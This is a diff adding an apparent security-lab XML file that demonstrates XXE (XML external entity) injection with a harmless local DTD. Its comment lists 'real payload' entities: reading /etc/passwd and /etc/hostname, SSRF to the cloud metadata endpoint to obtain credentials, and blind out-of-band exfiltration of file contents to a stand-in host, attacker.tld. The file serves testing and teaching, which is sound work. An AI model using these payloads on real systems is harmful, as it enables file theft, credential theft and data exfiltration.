@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Safe PoC -> x8bitranjit.
+  Benign PoC lab - x8bitranjit style. Authorized security testing only.
+
+  WHAT THIS DEMONSTRATES: XXE - resolution of an EXTERNAL entity from an
+  external DTD (xml_xxe_poc.dtd shipped next to this file).
+
+  WHERE IT FIRES: any parser that resolves external entities - server-side
+  XML processors, document importers, SAML/feeds parsers, some desktop tools.
+  Browsers parsing XML directly do NOT resolve external entities (safe).
+
+  THIS FILE IS BENIGN: the entity resolves to plain text declared in the
+  local DTD - no file is read, no network request is made.
+
+  THE REAL PAYLOAD (authorized targets only) is the same structure with the
+  entity value pointed at local files or URLs, e.g.:
+
+    <!ENTITY xxe SYSTEM "file:///etc/hostname">            (file read)
+    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">  (SSRF -> cloud creds)
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.tld/?d=%file;'>">
+    %eval; %exfil;                                          (blind OOB exfil)
+
+  Detection trick for a benign first probe: the entity value is unique text -
+  if it appears in the parser's output, external entities are enabled.
+-->
+<!DOCTYPE poc SYSTEM "xml_xxe_poc.dtd">
+<poc>
+  <title>Benign XXE PoC (external entity, local DTD)</title>
+  <resolved_entity>&readme;</resolved_entity>
+  <note>If the resolved_entity below your DTD load shows the DTD text, external entities are enabled in this parser.</note>
+</poc>
